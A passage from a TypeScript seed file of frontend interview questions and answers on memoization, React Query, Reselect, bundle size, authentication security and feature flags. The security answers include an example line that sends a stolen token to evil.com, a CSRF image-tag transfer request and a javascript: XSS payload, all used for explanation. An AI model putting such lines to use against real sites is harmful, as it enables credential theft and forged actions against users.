      const oldestKey = this.cache.keys().next().value;
      this.cache.delete(oldestKey);
    }
    
    this.cache.set(key, value);
  }
}

function memoizeWithLRU<T extends (...args: unknown[]) => unknown>(
  fn: T,
  maxSize = 100
): T {
  const cache = new LRUCache<string, ReturnType<T>>(maxSize);
  
  return ((...args: Parameters<T>) => {
    const key = stableStringify(args);
    const cached = cache.get(key);
    
    if (cached !== undefined) {
      return cached;
    }
    
    const result = fn(...args) as ReturnType<T>;
    cache.set(key, result);
    return result;
  }) as T;
}
\`\`\`

### 2. TTL (Time-To-Live)

\`\`\`typescript
interface CacheEntry<V> {
  value: V;
  expiry: number;
}

class TTLCache<K, V> {
  private cache = new Map<K, CacheEntry<V>>();
  private ttl: number;

  constructor(ttlMs: number) {
    this.ttl = ttlMs;
  }

  get(key: K): V | undefined {
    const entry = this.cache.get(key);
    
    if (!entry) {
      return undefined;
    }
    
    if (Date.now() > entry.expiry) {
      this.cache.delete(key);
      return undefined;
    }
    
    return entry.value;
  }

  set(key: K, value: V): void {
    this.cache.set(key, {
      value,
      expiry: Date.now() + this.ttl,
    });
  }

  // Periodic cleanup
  cleanup(): void {
    const now = Date.now();
    for (const [key, entry] of this.cache) {
      if (now > entry.expiry) {
        this.cache.delete(key);
      }
    }
  }
}
\`\`\`

### 3. LRU + TTL Combined

\`\`\`typescript
class LRUTTLCache<K, V> {
  private cache = new Map<K, { value: V; expiry: number }>();
  private maxSize: number;
  private ttl: number;

  constructor(maxSize: number, ttlMs: number) {
    this.maxSize = maxSize;
    this.ttl = ttlMs;
  }

  get(key: K): V | undefined {
    const entry = this.cache.get(key);
    
    if (!entry) return undefined;
    
    // Check TTL
    if (Date.now() > entry.expiry) {
      this.cache.delete(key);
      return undefined;
    }
    
    // LRU: Move to end
    this.cache.delete(key);
    this.cache.set(key, entry);
    
    return entry.value;
  }

  set(key: K, value: V): void {
    // Remove if exists
    this.cache.delete(key);
    
    // Evict if full
    if (this.cache.size >= this.maxSize) {
      const oldestKey = this.cache.keys().next().value;
      this.cache.delete(oldestKey);
    }
    
    this.cache.set(key, {
      value,
      expiry: Date.now() + this.ttl,
    });
  }
}
\`\`\`

### 4. Size-Based Eviction

\`\`\`typescript
class SizeLimitedCache<K, V> {
  private cache = new Map<K, V>();
  private sizes = new Map<K, number>();
  private currentSize = 0;
  private maxSize: number;
  
  constructor(maxSizeBytes: number) {
    this.maxSize = maxSizeBytes;
  }

  private estimateSize(value: V): number {
    const str = JSON.stringify(value);
    return str.length * 2; // Rough estimate (UTF-16)
  }

  set(key: K, value: V): void {
    const size = this.estimateSize(value);
    
    // Remove old entry if exists
    if (this.cache.has(key)) {
      this.currentSize -= this.sizes.get(key)!;
      this.cache.delete(key);
      this.sizes.delete(key);
    }
    
    // Evict until we have space
    while (this.currentSize + size > this.maxSize && this.cache.size > 0) {
      const oldestKey = this.cache.keys().next().value;
      this.currentSize -= this.sizes.get(oldestKey)!;
      this.cache.delete(oldestKey);
      this.sizes.delete(oldestKey);
    }
    
    this.cache.set(key, value);
    this.sizes.set(key, size);
    this.currentSize += size;
  }
}
\`\`\`

## Production-Ready Memoization

\`\`\`typescript
interface MemoizeOptions {
  maxSize?: number;
  ttl?: number;
  keyGenerator?: (...args: unknown[]) => string;
  onEvict?: (key: string, value: unknown) => void;
}

function memoize<T extends (...args: unknown[]) => unknown>(
  fn: T,
  options: MemoizeOptions = {}
): T & { cache: { clear: () => void; size: number } } {
  const {
    maxSize = 1000,
    ttl = Infinity,
    keyGenerator = stableStringify,
    onEvict,
  } = options;

  const cache = new LRUTTLCache<string, ReturnType<T>>(maxSize, ttl);

  const memoized = ((...args: Parameters<T>) => {
    const key = keyGenerator(args);
    const cached = cache.get(key);
    
    if (cached !== undefined) {
      return cached;
    }
    
    const result = fn(...args) as ReturnType<T>;
    cache.set(key, result);
    return result;
  }) as T & { cache: { clear: () => void; size: number } };

  memoized.cache = {
    clear: () => cache.clear(),
    get size() { return cache.size; },
  };

  return memoized;
}
\`\`\``,
    keyPoints: [
      "Understands serialization challenges with objects",
      "Knows WeakMap for reference-based memoization",
      "Can implement LRU cache from scratch",
      "Understands TTL and size-based eviction",
      "Considers memory management in caching",
    ],
    followUpQuestions: [
      "How would you handle async functions?",
      "What about cache warming strategies?",
      "How would you implement cache sharing across tabs?",
      "What are the tradeoffs between different eviction strategies?",
    ],
    relatedTopics: ["data-structures", "memory-management", "performance"],
    source: "seed",
    commonAt: ["Google", "Meta", "Netflix"],
  },
  {
    category: QUESTION_CATEGORIES.CACHING_MEMOIZATION,
    difficulty: "mid",
    question:
      "How does React Query (TanStack Query) implement its caching layer? Explain staleTime, gcTime, and the query lifecycle.",
    answer: `## React Query Cache Architecture

\`\`\`
┌─────────────────────────────────────────────────────────┐
│                    QueryClient                          │
┌─────────────────────────────────────────────────────────┤
│  ┌─────────────────────────────────────────────────┐   │
│  │              QueryCache                          │   │
│  │  ┌─────────────────────────────────────────┐    │   │
│  │  │  Query: ['users', 1]                    │    │   │
│  │  │  ┌── state: { data, error, status }     │    │   │
│  │  │  ┌── observers: [Component1, Component2]│    │   │
│  │  │  ┌── staleTime: 5000                    │    │   │
│  │  │  └── gcTime: 300000                     │    │   │
│  │  └─────────────────────────────────────────┘    │   │
│  │  ┌─────────────────────────────────────────┐    │   │
│  │  │  Query: ['users', 2]                    │    │   │
│  │  │  └── ...                                │    │   │
│  │  └─────────────────────────────────────────┘    │   │
│  └─────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
\`\`\`

## Key Timing Concepts

### staleTime (Data Freshness)

\`\`\`typescript
const { data } = useQuery({
  queryKey: ['user', userId],
  queryFn: fetchUser,
  staleTime: 5 * 60 * 1000, // 5 minutes
});

// Timeline:
// T=0: Fetch completes, data is FRESH
// T=0 to T=5min: Data is FRESH
//   - New components mounting get cached data immediately
//   - No background refetch
// T=5min+: Data becomes STALE
//   - Still returns cached data immediately
//   - Triggers background refetch on:
//     • Component mount
//     • Window focus
//     • Network reconnect
\`\`\`

### gcTime (Garbage Collection Time, formerly cacheTime)

\`\`\`typescript
const { data } = useQuery({
  queryKey: ['user', userId],
  queryFn: fetchUser,
  gcTime: 30 * 60 * 1000, // 30 minutes
});

// Timeline:
// T=0: Component mounts, fetch starts
// T=1s: Fetch completes, data cached
// T=10s: Component unmounts (no more observers)
//   - Query enters "inactive" state
//   - gcTime countdown starts
// T=10s to T=30min+10s: Data stays in cache
//   - If component remounts: instant data + possible refetch
// T=30min+10s: Data garbage collected
//   - If component mounts now: loading state, fresh fetch
\`\`\`

## Query Lifecycle States

\`\`\`typescript
type QueryStatus = 'pending' | 'error' | 'success';
type FetchStatus = 'fetching' | 'paused' | 'idle';

// State machine:
// 
// Initial Mount:
//   status: 'pending', fetchStatus: 'fetching'
//   └─► Fetch completes
//       status: 'success', fetchStatus: 'idle'
//
// Cached Data Available:
//   status: 'success', fetchStatus: 'idle'  (if fresh)
//   status: 'success', fetchStatus: 'fetching' (if stale, background refetch)
//
// Error:
//   status: 'error', fetchStatus: 'idle'
//   └─► Retry
//       status: 'error', fetchStatus: 'fetching'

function UserProfile({ userId }: { userId: string }) {
  const { data, status, fetchStatus, isLoading, isFetching } = useQuery({
    queryKey: ['user', userId],
    queryFn: () => fetchUser(userId),
  });

  // isLoading = status === 'pending' (no data yet)
  // isFetching = fetchStatus === 'fetching' (request in flight)
  
  // First load: isLoading=true, isFetching=true
  // Background refetch: isLoading=false, isFetching=true
  
  if (isLoading) {
    return <Skeleton />;
  }
  
  return (
    <div>
      {isFetching && <RefreshIndicator />}
      <UserCard user={data} />
    </div>
  );
}
\`\`\`

## Cache Invalidation

\`\`\`typescript
const queryClient = useQueryClient();

// 1. Invalidate specific query
queryClient.invalidateQueries({ queryKey: ['user', userId] });

// 2. Invalidate all queries starting with 'user'
queryClient.invalidateQueries({ queryKey: ['user'] });

// 3. Invalidate with predicate
queryClient.invalidateQueries({
  predicate: (query) => 
    query.queryKey[0] === 'user' && 
    query.state.dataUpdatedAt < Date.now() - 60000,
});

// 4. Optimistic update
const mutation = useMutation({
  mutationFn: updateUser,
  onMutate: async (newUser) => {
    // Cancel in-flight queries
    await queryClient.cancelQueries({ queryKey: ['user', newUser.id] });
    
    // Snapshot previous value
    const previousUser = queryClient.getQueryData(['user', newUser.id]);
    
    // Optimistically update
    queryClient.setQueryData(['user', newUser.id], newUser);
    
    return { previousUser };
  },
  onError: (err, newUser, context) => {
    // Rollback on error
    queryClient.setQueryData(['user', newUser.id], context?.previousUser);
  },
  onSettled: () => {
    // Refetch to ensure consistency
    queryClient.invalidateQueries({ queryKey: ['user'] });
  },
});
\`\`\`

## Query Deduplication

\`\`\`typescript
// Multiple components using same query key
function ComponentA() {
  const { data } = useQuery({ queryKey: ['user', 1], queryFn: fetchUser });
  return <div>{data?.name}</div>;
}

function ComponentB() {
  const { data } = useQuery({ queryKey: ['user', 1], queryFn: fetchUser });
  return <div>{data?.email}</div>;
}

function App() {
  return (
    <>
      <ComponentA />
      <ComponentB />
    </>
  );
}

// Result: Only ONE fetch request!
// Both components share the same cached query instance
\`\`\`

## Prefetching

\`\`\`typescript
const queryClient = useQueryClient();

// Prefetch on hover
function UserLink({ userId }: { userId: string }) {
  const prefetchUser = () => {
    queryClient.prefetchQuery({
      queryKey: ['user', userId],
      queryFn: () => fetchUser(userId),
      staleTime: 5000, // Don't prefetch if we have fresh data
    });
  };

  return (
    <Link 
      to={\`/users/\${userId}\`}
      onMouseEnter={prefetchUser}
    >
      View User
    </Link>
  );
}

// Prefetch in route loader (React Router)
export const loader = async ({ params }: LoaderFunctionArgs) => {
  await queryClient.ensureQueryData({
    queryKey: ['user', params.userId],
    queryFn: () => fetchUser(params.userId!),
  });
  return null;
};
\`\`\`

## Best Practices

\`\`\`typescript
// 1. Global defaults
const queryClient = new QueryClient({
  defaultOptions: {
    queries: {
      staleTime: 60 * 1000, // 1 minute
      gcTime: 5 * 60 * 1000, // 5 minutes
      retry: 3,
      refetchOnWindowFocus: true,
    },
  },
});

// 2. Query key factory pattern
const userKeys = {
  all: ['users'] as const,
  lists: () => [...userKeys.all, 'list'] as const,
  list: (filters: UserFilters) => [...userKeys.lists(), filters] as const,
  details: () => [...userKeys.all, 'detail'] as const,
  detail: (id: string) => [...userKeys.details(), id] as const,
};

// Usage
queryClient.invalidateQueries({ queryKey: userKeys.all }); // All user queries
queryClient.invalidateQueries({ queryKey: userKeys.lists() }); // All lists
queryClient.invalidateQueries({ queryKey: userKeys.detail(userId) }); // Specific user

// 3. Placeholder data for better UX
const { data } = useQuery({
  queryKey: ['user', userId],
  queryFn: () => fetchUser(userId),
  placeholderData: (previousData) => previousData, // Keep showing old data
});
\`\`\``,
    keyPoints: [
      "Understands staleTime vs gcTime difference",
      "Knows query status and fetch status states",
      "Can explain query deduplication",
      "Understands optimistic updates pattern",
      "Knows prefetching strategies",
      "Familiar with query key factory pattern",
    ],
    followUpQuestions: [
      "How would you handle dependent queries?",
      "What's the difference between invalidate and reset?",
      "How does React Query handle pagination/infinite queries?",
      "How would you implement offline persistence?",
    ],
    relatedTopics: ["react-query", "state-management", "data-fetching"],
    source: "seed",
    commonAt: ["Most modern React companies"],
  },
  {
    category: QUESTION_CATEGORIES.CACHING_MEMOIZATION,
    difficulty: "mid",
    question:
      "Explain the concept of selector memoization in Redux. How does Reselect work, and when would you create custom equality checks?",
    answer: `## Why Selectors Need Memoization

\`\`\`typescript
// Without memoization - creates new array every time
const selectFilteredTodos = (state: RootState) => {
  // This runs on EVERY state change, even unrelated ones
  return state.todos.filter(todo => !todo.completed);
};

function TodoList() {
  // New array reference every render = infinite re-renders with useEffect
  const todos = useSelector(selectFilteredTodos);
  
  useEffect(() => {
    console.log('Todos changed!');
  }, [todos]); // Triggers every time!
}
\`\`\`

## Reselect Fundamentals

\`\`\`typescript
import { createSelector } from '@reduxjs/toolkit';

// Input selectors - extract pieces of state
const selectTodos = (state: RootState) => state.todos;
const selectFilter = (state: RootState) => state.filter;

// Memoized selector - only recomputes when inputs change
const selectFilteredTodos = createSelector(
  [selectTodos, selectFilter],
  (todos, filter) => {
    // This transformation only runs if todos or filter changed
    switch (filter) {
      case 'active':
        return todos.filter(todo => !todo.completed);
      case 'completed':
        return todos.filter(todo => todo.completed);
      default:
        return todos;
    }
  }
);

// Usage
const todos = useSelector(selectFilteredTodos);
// Returns same reference if inputs unchanged!
\`\`\`

## How Reselect Works Internally

\`\`\`typescript
// Simplified implementation
function createSelector<S, R1, R2, Result>(
  selector1: (state: S) => R1,
  selector2: (state: S) => R2,
  combiner: (res1: R1, res2: R2) => Result
): (state: S) => Result {
  let lastArgs: [R1, R2] | null = null;
  let lastResult: Result | null = null;

  return (state: S) => {
    const newArgs: [R1, R2] = [selector1(state), selector2(state)];
    
    // Check if any input changed (reference equality)
    if (
      lastArgs !== null &&
      newArgs[0] === lastArgs[0] &&
      newArgs[1] === lastArgs[1]
    ) {
      return lastResult!;
    }
    
    // Recompute
    lastArgs = newArgs;
    lastResult = combiner(newArgs[0], newArgs[1]);
    return lastResult;
  };
}
\`\`\`

## Composing Selectors

\`\`\`typescript
// Base selectors
const selectUsers = (state: RootState) => state.users;
const selectPosts = (state: RootState) => state.posts;
const selectCurrentUserId = (state: RootState) => state.auth.userId;

// Composed selector
const selectCurrentUser = createSelector(
  [selectUsers, selectCurrentUserId],
  (users, userId) => users.find(u => u.id === userId)
);

// Further composition
const selectCurrentUserPosts = createSelector(
  [selectPosts, selectCurrentUserId],
  (posts, userId) => posts.filter(p => p.authorId === userId)
);

// Multiple levels deep
const selectCurrentUserPostsWithStats = createSelector(
  [selectCurrentUserPosts],
  (posts) => ({
    posts,
    totalCount: posts.length,
    publishedCount: posts.filter(p => p.published).length,
  })
);
\`\`\`

## Parameterized Selectors

\`\`\`typescript
// ❌ Bad: Creates new selector instance every render
const selectTodoById = (state: RootState, todoId: string) =>
  createSelector(
    [selectTodos],
    (todos) => todos.find(t => t.id === todoId)
  )(state);

// ✅ Good: Factory pattern
const makeSelectTodoById = () =>
  createSelector(
    [selectTodos, (state: RootState, todoId: string) => todoId],
    (todos, todoId) => todos.find(t => t.id === todoId)
  );

// Usage in component
function TodoItem({ todoId }: { todoId: string }) {
  // Create selector instance once per component
  const selectTodoById = useMemo(makeSelectTodoById, []);
  const todo = useSelector((state) => selectTodoById(state, todoId));
  
  return <div>{todo?.title}</div>;
}

// ✅ Better with RTK: createSelector with cache
import { createSelector } from '@reduxjs/toolkit';

const selectTodoById = createSelector(
  [selectTodos, (state: RootState, todoId: string) => todoId],
  (todos, todoId) => todos.find(t => t.id === todoId),
  {
    memoizeOptions: {
      maxSize: 100, // Cache up to 100 different todoIds
    },
  }
);
\`\`\`

## Custom Equality Checks

\`\`\`typescript
import { createSelectorCreator, lruMemoize } from '@reduxjs/toolkit';
import { isEqual } from 'lodash';

// 1. Deep equality for complex objects
const createDeepEqualSelector = createSelectorCreator({
  memoize: lruMemoize,
  memoizeOptions: {
    equalityCheck: isEqual,
    maxSize: 10,
  },
});

const selectFormattedData = createDeepEqualSelector(
  [selectRawData],
  (rawData) => {
    // Heavy transformation
    return rawData.map(item => ({
      ...item,
      displayName: \`\${item.firstName} \${item.lastName}\`,
    }));
  }
);

// 2. Shallow equality for arrays
import { shallowEqual } from 'react-redux';

const selectUserIds = createSelector(
  [selectUsers],
  (users) => users.map(u => u.id),
  {
    memoizeOptions: {
      resultEqualityCheck: shallowEqual, // Compare result arrays
    },
  }
);

// 3. Custom comparison for specific fields
const selectRelevantUserData = createSelector(
  [selectUsers],
  (users) => users.map(u => ({ id: u.id, name: u.name })),
  {
    memoizeOptions: {
      resultEqualityCheck: (a, b) => {
        if (a.length !== b.length) return false;
        return a.every((item, i) => 
          item.id === b[i].id && item.name === b[i].name
        );
      },
    },
  }
);
\`\`\`

## When to Use Custom Equality

\`\`\`typescript
// 1. API data with same content but new references
// API returns: { users: [...] } - new array every time
const selectUsersWithDeepEqual = createDeepEqualSelector(
  [selectApiResponse],
  (response) => response.users
);

// 2. Derived arrays that often have same values
const selectActiveUserIds = createSelector(
  [selectUsers],
  (users) => users.filter(u => u.isActive).map(u => u.id),
  {
    memoizeOptions: {
      resultEqualityCheck: (a, b) => 
        a.length === b.length && a.every((id, i) => id === b[i]),
    },
  }
);

// 3. Objects with irrelevant changing fields
interface User {
  id: string;
  name: string;
  lastSeen: Date; // Changes frequently, but we don't care
}

const createUserEqualityCheck = (a: User[], b: User[]) => {
  if (a.length !== b.length) return false;
  return a.every((user, i) => 
    user.id === b[i].id && user.name === b[i].name
    // Ignores lastSeen
  );
};
\`\`\`

## Performance Tips

\`\`\`typescript
// 1. Keep selectors small and focused
// ❌ Bad
const selectEverything = createSelector([selectState], (state) => ({
  users: state.users,
  posts: state.posts,
  comments: state.comments,
  // ...
}));

// ✅ Good
const selectUsers = (state: RootState) => state.users;
const selectPosts = (state: RootState) => state.posts;

// 2. Avoid creating objects in input selectors
// ❌ Bad
const selectUserAndFilter = createSelector(
  [(state) => ({ user: state.user, filter: state.filter })], // New object!
  (combined) => ...
);

// ✅ Good
const selectUserAndFilter = createSelector(
  [selectUser, selectFilter],
  (user, filter) => ...
);

// 3. Use weakMapMemoize for instance-based caching
import { weakMapMemoize } from '@reduxjs/toolkit';

const selectItemsByCategory = createSelector(
  [selectItems, (state: RootState, category: string) => category],
  (items, category) => items.filter(i => i.category === category),
  { memoize: weakMapMemoize }
);
\`\`\``,
    keyPoints: [
      "Understands why derived data needs memoization",
      "Can explain how Reselect caches results",
      "Knows how to compose selectors",
      "Can implement parameterized selectors correctly",
      "Understands when to use custom equality checks",
    ],
    followUpQuestions: [
      "How would you debug a selector that's recomputing too often?",
      "What's the memory footprint of memoized selectors?",
      "How does selector memoization compare to component memoization?",
      "When would you NOT use a memoized selector?",
    ],
    relatedTopics: ["redux", "state-management", "performance", "memoization"],
    source: "seed",
    commonAt: ["Companies using Redux"],
  },
];

// ============================================================================
// BUNDLE SIZE & TREE SHAKING
// ============================================================================

const bundleTreeShakingQuestions: CreateQuestionInput[] = [
  {
    category: QUESTION_CATEGORIES.BUNDLE_TREE_SHAKING,
    difficulty: "senior",
    question:
      "Explain how tree shaking works in modern bundlers. Why do some libraries not tree-shake well, and how would you audit and fix bundle size issues?",
    answer: `## How Tree Shaking Works

Tree shaking is dead code elimination based on ES Module static analysis. Bundlers analyze import/export statements to determine which code is actually used.

### Prerequisites for Tree Shaking

\`\`\`typescript
// ✅ ES Modules - static, analyzable
import { map, filter } from 'lodash-es';
export const utils = { map, filter };

// ❌ CommonJS - dynamic, not analyzable
const _ = require('lodash');
module.exports = { map: _.map };
\`\`\`

### Why Some Libraries Don't Tree-Shake

**1. Side Effects in Module Scope:**
\`\`\`typescript
// ❌ Bad: Side effect at module level
console.log('Utils loaded!'); // Bundler can't remove this file
export const add = (a: number, b: number) => a + b;
\`\`\`

**2. Missing sideEffects Field:**
\`\`\`json
{
  "name": "my-library",
  "sideEffects": false
}
\`\`\`

**3. Barrel Files Anti-Pattern:**
\`\`\`typescript
// ❌ Bad: Re-exporting everything
export * from './Button';
export * from './Card';
// ... 50 more components
\`\`\`

### Auditing Bundle Size

\`\`\`bash
# Webpack Bundle Analyzer
npx webpack-bundle-analyzer stats.json

# Vite
npm install rollup-plugin-visualizer
\`\`\`

### Fixing Bundle Issues

\`\`\`typescript
// 1. Direct imports instead of barrel files
import { Button } from './components/Button';

// 2. Replace heavy libraries
import { debounce } from 'lodash-es'; // Instead of full lodash

// 3. Dynamic imports for conditional features
const PDFExport = lazy(() => import('./PDFExport'));
\`\`\``,
    keyPoints: [
      "Understands ES Modules requirement for tree shaking",
      "Knows sideEffects field in package.json",
      "Can identify barrel file anti-pattern",
      "Familiar with bundle analysis tools",
    ],
    followUpQuestions: [
      "How does tree shaking differ between Webpack and Rollup?",
      "What's the impact of CSS-in-JS on bundle size?",
    ],
    relatedTopics: ["webpack", "vite", "code-splitting", "performance"],
    source: "seed",
    commonAt: ["Vercel", "Shopify"],
  },
  {
    category: QUESTION_CATEGORIES.BUNDLE_TREE_SHAKING,
    difficulty: "mid",
    question:
      "Explain code splitting strategies in React. When would you use route-based vs component-based splitting?",
    answer: `## Code Splitting Strategies

### Route-Based Splitting
Best for: Pages/routes users may never visit

\`\`\`typescript
const Dashboard = lazy(() => import('./pages/Dashboard'));
const Settings = lazy(() => import('./pages/Settings'));

function App() {
  return (
    <Suspense fallback={<PageSkeleton />}>
      <Routes>
        <Route path="/dashboard" element={<Dashboard />} />
        <Route path="/settings" element={<Settings />} />
      </Routes>
    </Suspense>
  );
}
\`\`\`

### Component-Based Splitting
Best for: Heavy components not immediately visible

\`\`\`typescript
const HeavyModal = lazy(() => import('./HeavyModal'));

function Page() {
  const [showModal, setShowModal] = useState(false);
  
  return (
    <>
      <button onClick={() => setShowModal(true)}>Open</button>
      {showModal && (
        <Suspense fallback={<Spinner />}>
          <HeavyModal />
        </Suspense>
      )}
    </>
  );
}
\`\`\`

### Preloading Strategies

\`\`\`typescript
// Preload on hover
<Link 
  to="/dashboard"
  onMouseEnter={() => import('./pages/Dashboard')}
>
  Dashboard
</Link>
\`\`\`

| Strategy | Use When |
|----------|----------|
| Route-based | Separate pages |
| Component-based | Heavy below-fold content |
| Feature-based | Conditional features |`,
    keyPoints: [
      "Understands route vs component splitting",
      "Knows React.lazy and Suspense usage",
      "Can implement preloading strategies",
    ],
    followUpQuestions: [
      "How would you handle chunk loading errors?",
      "What's the overhead of too many small chunks?",
    ],
    relatedTopics: ["react-lazy", "suspense", "webpack"],
    source: "seed",
    commonAt: ["Most React companies"],
  },
];

// ============================================================================
// SECURITY & AUTHENTICATION
// ============================================================================

const securityAuthQuestions: CreateQuestionInput[] = [
  {
    category: QUESTION_CATEGORIES.SECURITY_AUTH,
    difficulty: "senior",
    question:
      "Compare localStorage vs HttpOnly cookies for storing authentication tokens. What are the security implications of each approach?",
    answer: `## Security Comparison

| Aspect | localStorage | HttpOnly Cookie |
|--------|-------------|-----------------|
| XSS Vulnerability | **HIGH** - JS can read | **LOW** - JS cannot access |
| CSRF Vulnerability | **LOW** - Not auto-sent | **HIGH** - Auto-sent |
| Subdomains | Same origin only | Configurable |

## XSS Attack Vector

\`\`\`typescript
// localStorage - vulnerable to XSS
const stolenToken = localStorage.getItem('authToken');
fetch('https://evil.com/steal', { body: stolenToken });

// HttpOnly cookie - protected from XSS
document.cookie; // HttpOnly cookies not visible
\`\`\`

## CSRF Attack Vector

\`\`\`html
<!-- HttpOnly cookie - vulnerable to CSRF -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
\`\`\`

## Best Practice: Hybrid Approach

\`\`\`typescript
// Server
res.cookie('refreshToken', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  path: '/api/auth/refresh',
});

// Client - store access token in memory
class AuthManager {
  private accessToken: string | null = null;
  
  async fetch(url: string, options: RequestInit = {}) {
    return fetch(url, {
      ...options,
      credentials: 'include',
      headers: {
        ...options.headers,
        'Authorization': \`Bearer \${this.accessToken}\`,
      },
    });
  }
}
\`\`\`

**Recommendation:**
- Access Token: Memory (15 min expiry)
- Refresh Token: HttpOnly cookie
- Add CSRF tokens for cookie-based requests`,
    keyPoints: [
      "Understands XSS vs CSRF attack vectors",
      "Knows HttpOnly prevents JavaScript access",
      "Recommends hybrid approach",
      "Implements CSRF protection",
    ],
    followUpQuestions: [
      "How would you handle token refresh in a SPA?",
      "What about subdomain cookie sharing?",
    ],
    relatedTopics: ["xss", "csrf", "jwt", "session-management"],
    source: "seed",
    commonAt: ["Any company handling auth"],
  },
  {
    category: QUESTION_CATEGORIES.SECURITY_AUTH,
    difficulty: "mid",
    question:
      "What is XSS (Cross-Site Scripting)? Explain the different types and how to prevent them in a React application.",
    answer: `## XSS Types

### 1. Stored XSS
Script stored in database, served to all users.

### 2. Reflected XSS
Script reflected from URL parameters.

### 3. DOM-based XSS
Client-side JS manipulates DOM unsafely.

## React's Built-in Protection

\`\`\`tsx
// ✅ Safe - React escapes this
function Comment({ text }: { text: string }) {
  return <p>{text}</p>;
}
// "<script>alert('xss')</script>" → displayed as text
\`\`\`

## React XSS Vulnerabilities

### dangerouslySetInnerHTML

\`\`\`tsx
// ❌ Dangerous
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// ✅ Safe - sanitize first
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ 
  __html: DOMPurify.sanitize(userInput) 
}} />
\`\`\`

### javascript: URLs

\`\`\`tsx
// ❌ Vulnerable
<a href={userUrl}>Link</a>
// Attacker: javascript:alert('XSS')

// ✅ Safe - validate protocol
const safeUrl = url.startsWith('http') ? url : '#';
\`\`\`

## Prevention Checklist
- Use React's default escaping
- Sanitize HTML with DOMPurify
- Validate URLs (block javascript:)
- Implement Content Security Policy`,
    keyPoints: [
      "Can explain stored, reflected, DOM-based XSS",
      "Understands React's automatic escaping",
      "Knows dangerous patterns",
      "Implements sanitization",
    ],
    followUpQuestions: [
      "How does CSP help prevent XSS?",
      "What about XSS in SSR contexts?",
    ],
    relatedTopics: ["security", "csp", "sanitization"],
    source: "seed",
    commonAt: ["Any security-conscious company"],
  },
];

// ============================================================================
// FEATURE FLAGS
// ============================================================================

const featureFlagsQuestions: CreateQuestionInput[] = [
  {
    category: QUESTION_CATEGORIES.FEATURE_FLAGS,
    difficulty: "senior",
    question:
      "Design a feature flag system for a large-scale frontend application. How would you handle gradual rollouts, A/B testing, and flag dependencies?",
    answer: `## Feature Flag Architecture

\`\`\`typescript
interface FeatureFlag {
  key: string;
  type: 'boolean' | 'string' | 'number';
  defaultValue: unknown;
  rules: TargetingRule[];
  rollout?: { percentage: number };
  prerequisites?: { flagKey: string; requiredValue: unknown }[];
}

interface TargetingRule {
  conditions: Condition[];
  value: unknown;
  percentage?: number;
}
\`\`\`

## Flag Evaluation Engine

\`\`\`typescript
class FlagEvaluator {
  evaluate<T>(flag: FeatureFlag, context: UserContext): T {
    // 1. Check prerequisites
    for (const prereq of flag.prerequisites ?? []) {
      if (this.evaluate(this.getFlag(prereq.flagKey), context) !== prereq.requiredValue) {
        return flag.defaultValue as T;
      }
    }
    
    // 2. Evaluate targeting rules
    for (const rule of flag.rules) {
      if (this.matchesRule(rule, context)) {
        return rule.value as T;
      }
    }
    
    // 3. Apply percentage rollout with consistent bucketing
    if (flag.rollout && this.isInPercentage(context.userId, flag.key, flag.rollout.percentage)) {
      return true as T;
    }
    
    return flag.defaultValue as T;
  }
  
  private isInPercentage(userId: string, flagKey: string, percentage: number): boolean {
    const hash = this.hash(\`\${userId}:\${flagKey}\`);
    return (hash % 100) + 1 <= percentage;
  }
}
\`\`\`

## React Integration

\`\`\`typescript
function useFeatureFlag(flagKey: string): boolean {
  const { flags } = useContext(FeatureFlagContext);
  return Boolean(flags[flagKey]);
}

// Usage
function Checkout() {
  const useNewCheckout = useFeatureFlag('new-checkout');
  return useNewCheckout ? <NewCheckout /> : <LegacyCheckout />;
}
\`\`\`

## Gradual Rollout Configuration

\`\`\`typescript
const flag: FeatureFlag = {
  key: 'new-checkout',
  rules: [
    { conditions: [{ attribute: 'email', operator: 'contains', value: '@company.com' }], value: true },
    { conditions: [{ attribute: 'isBetaUser', operator: 'equals', value: true }], value: true },
  ],
  rollout: { percentage: 25 }, // Start at 25%, increase gradually
};
\`\`\``,
    keyPoints: [
      "Understands targeting rules",
      "Implements consistent percentage bucketing",
      "Handles flag dependencies",
      "Integrates with analytics for A/B testing",
    ],
    followUpQuestions: [
      "How would you handle stale flags during deployment?",
      "How do you test code paths for flags that are off?",
    ],
    relatedTopics: [
      "a-b-testing",
      "gradual-rollout",
      "trunk-based-development",
    ],
    source: "seed",
    commonAt: ["Netflix", "Spotify", "LinkedIn"],
  },
  {
    category: QUESTION_CATEGORIES.FEATURE_FLAGS,
    difficulty: "mid",
    question:
      "How do feature flags enable trunk-based development? What are the best practices for managing flag lifecycle?",
    answer: `## Trunk-Based Development with Feature Flags

\`\`\`
Traditional: Feature branches (days/weeks)
main ────────────────────────────────►
      \\──feature-branch──────────/

Trunk-based: Short-lived branches + flags
main ────────────────────────────────►
       → → → → (daily commits behind flags)
\`\`\`

## Benefits

1. **Continuous Integration**: Code merged daily
2. **Reduced Merge Conflicts**: Small, frequent merges
3. **Safer Deployments**: Feature hidden until ready
4. **Quick Rollback**: Disable flag without deploy

## Flag Lifecycle

\`\`\`
1. CREATED    → Flag added, default OFF
2. DEVELOPING → Code committed behind flag
3. TESTING    → Enabled for QA/staging
4. ROLLING    → Gradual production rollout
5. RELEASED   → 100% enabled
6. CLEANUP    → Remove flag code
7. ARCHIVED   → Flag deleted
\`\`\`

## Best Practices

\`\`\`typescript
// 1. Flag naming convention
const FLAGS = {
  CHECKOUT_V2: 'checkout-v2',           // Feature flag
  EXPERIMENT_CTA_COLOR: 'exp-cta-color', // Experiment
  OPS_RATE_LIMIT: 'ops-rate-limit',      // Operational
} as const;

// 2. Default to OFF for safety
const flag: FeatureFlag = {
  key: 'risky-feature',
  defaultValue: false, // Always safe default
};

// 3. Set expiration dates
interface FeatureFlag {
  expiresAt?: string; // Alert when flag should be cleaned up
}

// 4. Document flag purpose
interface FeatureFlag {
  description: string;
  owner: string;
  jiraTicket?: string;
}
\`\`\`

## Flag Cleanup Process

\`\`\`typescript
// Before cleanup
function Checkout() {
  const useNewCheckout = useFeatureFlag('checkout-v2');
  return useNewCheckout ? <NewCheckout /> : <LegacyCheckout />;
}

// After cleanup (flag at 100% for 2 weeks)
function Checkout() {
  return <NewCheckout />;
}
// Delete LegacyCheckout component
// Remove flag from system
\`\`\``,
    keyPoints: [
      "Understands trunk-based development benefits",
      "Knows flag lifecycle stages",
